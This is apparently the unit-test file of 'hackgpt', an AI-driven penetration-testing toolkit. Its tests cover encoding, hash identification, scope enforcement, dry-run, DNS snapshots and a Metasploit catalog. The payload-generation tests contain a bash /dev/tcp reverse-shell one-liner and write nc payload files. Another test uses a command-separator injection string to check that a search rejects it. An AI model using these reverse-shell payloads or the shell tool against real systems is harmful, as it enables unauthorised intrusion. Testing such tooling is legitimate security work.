"""Tool handlers: registry consistency, utilities, scope enforcement, dry-run."""
from __future__ import annotations

import base64
import json
import os
import unittest
from unittest.mock import patch

from hackgpt import config as C
from hackgpt.config import ScopeDenied
from hackgpt.tools import (
    HANDLERS,
    TOOLS,
    ToolError,
    h_encode,
    h_file_write,
    h_hash_info,
    h_nmap,
    h_note,
    h_payload_gen,
    h_report,
    h_scope,
    h_shell,
    h_tls_cert,
    h_web_dirs,
    h_msf_catalog,
    h_dns_snapshot,
)

from .helpers import make_ctx


def _b64url(s: str) -> str:
    return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")


class Registry(unittest.TestCase):
    def test_schemas_match_handlers(self):
        names = [t["function"]["name"] for t in TOOLS]
        self.assertEqual(len(names), len(set(names)), "duplicate tool schemas")
        self.assertEqual(set(names), set(HANDLERS), "schema/handler mismatch")

    def test_required_args_present(self):
        for schema in TOOLS:
            fn = schema["function"]
            props = fn["parameters"]["properties"]
            for req in fn["parameters"]["required"]:
                self.assertIn(req, props, f"{fn['name']}: required '{req}' not in properties")


class Encode(unittest.TestCase):
    def test_base64_roundtrip(self):
        ctx = make_ctx()
        enc = h_encode({"input": "hello world", "op": "encode", "codec": "base64"}, ctx)
        self.assertEqual(enc, "aGVsbG8gd29ybGQ=")
        self.assertEqual(ctx.session["actions"][-1]["tool"], "encode")
        self.assertEqual(h_encode({"input": enc, "op": "decode", "codec": "base64"}, ctx), "hello world")

    def test_hex_roundtrip(self):
        ctx = make_ctx()
        enc = h_encode({"input": "ABC", "op": "encode", "codec": "hex"}, ctx)
        self.assertEqual(enc, "414243")
        self.assertEqual(h_encode({"input": enc, "op": "decode", "codec": "hex"}, ctx), "ABC")

    def test_url_roundtrip(self):
        ctx = make_ctx()
        enc = h_encode({"input": "a b&c=d", "op": "encode", "codec": "url"}, ctx)
        self.assertEqual(enc, "a%20b%26c%3Dd")
        self.assertEqual(h_encode({"input": enc, "op": "decode", "codec": "url"}, ctx), "a b&c=d")

    def test_rot13(self):
        ctx = make_ctx()
        enc = h_encode({"input": "hello", "codec": "rot13"}, ctx)
        self.assertEqual(enc, "uryyb")
        self.assertEqual(h_encode({"input": enc, "op": "decode", "codec": "rot13"}, ctx), "hello")

    def test_jwt_decode(self):
        ctx = make_ctx()
        token = _b64url('{"alg":"HS256","typ":"JWT"}') + "." + \
                _b64url('{"sub":"123","admin":true}') + ".c2ln"
        out = h_encode({"input": token, "op": "decode", "codec": "jwt"}, ctx)
        self.assertIn('"admin":true', out)
        self.assertIn("signature:", out)

    def test_jwt_encode_rejected(self):
        with self.assertRaises(ToolError):
            h_encode({"input": "x", "op": "encode", "codec": "jwt"}, make_ctx())

    def test_bad_codec_and_op(self):
        with self.assertRaises(ToolError):
            h_encode({"input": "x", "codec": "nope"}, make_ctx())
        with self.assertRaises(ToolError):
            h_encode({"input": "x", "op": "sideways"}, make_ctx())

    def test_b64_tolerates_missing_padding(self):
        ctx = make_ctx()
        self.assertEqual(h_encode({"input": "aGVsbG8", "op": "decode", "codec": "base64"}, ctx), "hello")


class HashInfo(unittest.TestCase):
    def test_md5(self):
        out = h_hash_info({"hash": "5d41402abc4b2a76b9719d911017c592"}, make_ctx())
        self.assertIn("MD5", out)
        self.assertIn("NTLM", out)

    def test_sha256(self):
        out = h_hash_info({"hash": "a" * 64}, make_ctx())
        self.assertIn("SHA256", out)

    def test_bcrypt(self):
        out = h_hash_info({"hash": "$2b$12$" + "a" * 53}, make_ctx())
        self.assertIn("bcrypt", out)

    def test_unknown(self):
        out = h_hash_info({"hash": "zzz"}, make_ctx())
        self.assertIn("no known format", out)

    def test_empty(self):
        with self.assertRaises(ToolError):
            h_hash_info({"hash": ""}, make_ctx())


class PayloadGen(unittest.TestCase):
    def test_bash_contains_endpoint(self):
        ctx = make_ctx()
        out = h_payload_gen({"type": "bash", "lhost": "10.0.0.5", "lport": "4444"}, ctx)
        self.assertIn("10.0.0.5", out)
        self.assertIn("4444", out)
        self.assertEqual(ctx.session["actions"][-1]["tool"], "payload_gen")

    def test_base64_wrap(self):
        ctx = make_ctx()
        out = h_payload_gen({"type": "bash", "lhost": "1.2.3.4", "lport": "9", "base64": True}, ctx)
        encoded = out.splitlines()[-1]
        self.assertEqual(base64.b64decode(encoded).decode(), f"bash -i >& /dev/tcp/1.2.3.4/9 0>&1")

    def test_output_file(self):
        ctx = make_ctx()
        out = h_payload_gen({"type": "nc", "lhost": "1.2.3.4", "lport": "9", "output": "p.sh"}, ctx)
        path = os.path.join(ctx.output_dir, "p.sh")
        self.assertTrue(os.path.exists(path))
        self.assertIn(path, ctx.session["artifacts"])
        self.assertIn("saved ->", out)

    def test_unknown_type(self):
        with self.assertRaises(ToolError):
            h_payload_gen({"type": "nope", "lhost": "1.2.3.4", "lport": "9"}, make_ctx())


class ShellAndScope(unittest.TestCase):
    def test_shell_runs(self):
        ctx = make_ctx()
        out = h_shell({"command": "echo hello-hackgpt"}, ctx)
        self.assertIn("rc=0", out)
        self.assertIn("hello-hackgpt", out)

    def test_shell_dry_run(self):
        ctx = make_ctx(dry_run=True)
        self.assertEqual(h_shell({"command": "echo hi"}, ctx), "[dry-run] would run: echo hi")

    def test_shell_requires_command(self):
        with self.assertRaises(ToolError):
            h_shell({}, make_ctx())


class Nmap(unittest.TestCase):
    def test_unknown_profile(self):
        with self.assertRaises(ToolError):
            h_nmap({"target": "127.0.0.1", "profile": "bogus"}, make_ctx(scope=["127.0.0.1"]))

    def test_out_of_scope(self):
        with self.assertRaises(ScopeDenied):
            h_nmap({"target": "127.0.0.1"}, make_ctx(scope=[]))

    def test_dry_run(self):
        out = h_nmap({"target": "127.0.0.1", "profile": "quick"},
                     make_ctx(scope=["127.0.0.1"], dry_run=True))
        self.assertIn("[dry-run] would scan:", out)

    def test_enforcement_disabled(self):
        out = h_nmap({"target": "127.0.0.1", "profile": "quick"},
                     make_ctx(scope=[], enforce=False, dry_run=True))
        self.assertIn("[dry-run] would scan:", out)


class NoteAndScope(unittest.TestCase):
    def test_note_records(self):
        ctx = make_ctx()
        h_note({"text": "found creds", "category": "credential", "host": "10.0.0.9"}, ctx)
        self.assertEqual(ctx.session["findings"][0]["category"], "credential")
        self.assertEqual(ctx.session["credentials"][0]["host"], "10.0.0.9")

    def test_scope_lifecycle(self):
        ctx = make_ctx()
        h_scope({"action": "add", "target": "example.com"}, ctx)
        self.assertIn("IN scope", h_scope({"action": "check", "target": "example.com"}, ctx))
        self.assertTrue(C.target_in_scope("example.com", C.load_config()["scope"]))
        h_scope({"action": "remove", "target": "example.com"}, ctx)
        self.assertFalse(C.target_in_scope("example.com", ctx.config["scope"]))

    def test_scope_bad_action(self):
        with self.assertRaises(ToolError):
            h_scope({"action": "explode"}, make_ctx())


class Artifacts(unittest.TestCase):
    def test_file_write(self):
        ctx = make_ctx()
        out = h_file_write({"path": "note.txt", "content": "hello"}, ctx)
        path = os.path.join(ctx.output_dir, "note.txt")
        self.assertTrue(os.path.exists(path))
        self.assertIn(path, ctx.session["artifacts"])
        self.assertIn("wrote 5 bytes", out)

    def test_report_save(self):
        ctx = make_ctx()
        h_note({"text": "finding one"}, ctx)
        out = h_report({"action": "save"}, ctx)
        path = os.path.join(ctx.output_dir, "report-t.md")
        self.assertTrue(os.path.exists(path))
        self.assertIn("report saved ->", out)
        with open(path, encoding="utf-8") as fh:
            self.assertIn("finding one", fh.read())


class NetworkToolsDryRun(unittest.TestCase):
    def test_web_dirs_dry_run(self):
        ctx = make_ctx(scope=["example.com"], dry_run=True)
        out = h_web_dirs({"url": "example.com"}, ctx)
        self.assertIn("[dry-run] would probe", out)

    def test_web_dirs_out_of_scope(self):
        with self.assertRaises(ScopeDenied):
            h_web_dirs({"url": "example.com"}, make_ctx(scope=[]))

    def test_tls_cert_dry_run(self):
        ctx = make_ctx(scope=["example.com"], dry_run=True)
        out = h_tls_cert({"target": "example.com"}, ctx)
        self.assertIn("[dry-run] would fetch", out)

    def test_tls_cert_requires_target(self):
        with self.assertRaises(ToolError):
            h_tls_cert({}, make_ctx(scope=["example.com"]))

    def test_web_dirs_wordlist_missing(self):
        ctx = make_ctx(scope=["example.com"])
        with self.assertRaises(ToolError):
            h_web_dirs({"url": "example.com", "wordlist": "nope.txt"}, ctx)


class DnsSnapshot(unittest.TestCase):
    def test_reports_changes_against_persisted_snapshot(self):
        ctx = make_ctx(scope=["example.com"])
        rows = [type("Row", (), {"__getitem__": lambda self, k: ("192.0.2.10", 0)[0]})()]
        with patch("hackgpt.tools.socket.getaddrinfo", return_value=[(0, 0, 0, "", ("192.0.2.10", 0))]):
            first = h_dns_snapshot({"domain": "example.com"}, ctx)
        self.assertIn("baseline created", first)
        with patch("hackgpt.tools.socket.getaddrinfo", return_value=[(0, 0, 0, "", ("192.0.2.11", 0))]):
            second = h_dns_snapshot({"domain": "example.com"}, ctx)
        self.assertIn("added: 192.0.2.11", second)
        self.assertIn("removed: 192.0.2.10", second)

    def test_requires_scope(self):
        with self.assertRaises(ScopeDenied):
            h_dns_snapshot({"domain": "example.com"}, make_ctx(scope=[]))

    def test_dry_run_does_not_write(self):
        ctx = make_ctx(scope=["example.com"], dry_run=True)
        self.assertIn("[dry-run]", h_dns_snapshot({"domain": "example.com"}, ctx))


class MetasploitCatalog(unittest.TestCase):
    def test_search_uses_auxiliary_catalog_only(self):
        ctx = make_ctx()
        proc = type("Proc", (), {"stdout": "auxiliary/scanner/http/title\\n", "stderr": "", "returncode": 0})()
        with patch("hackgpt.tools.C.which", return_value="/usr/bin/msfconsole"):
            with patch("hackgpt.tools.subprocess.run", return_value=proc) as run:
                out = h_msf_catalog({"action": "search", "query": "http title"}, ctx)
        self.assertIn("auxiliary/scanner/http/title", out)
        self.assertIn("type:auxiliary", run.call_args.args[0][-1])
        self.assertEqual(ctx.session["actions"][-1]["tool"], "msf_catalog")

    def test_rejects_module_execution(self):
        with self.assertRaises(ToolError):
            h_msf_catalog({"action": "run", "query": "exploit/multi/handler"}, make_ctx())

    def test_search_query_rejects_command_separators(self):
        with self.assertRaises(ToolError):
            h_msf_catalog({"action": "search", "query": "http; exploit"}, make_ctx())


if __name__ == "__main__":
    unittest.main()
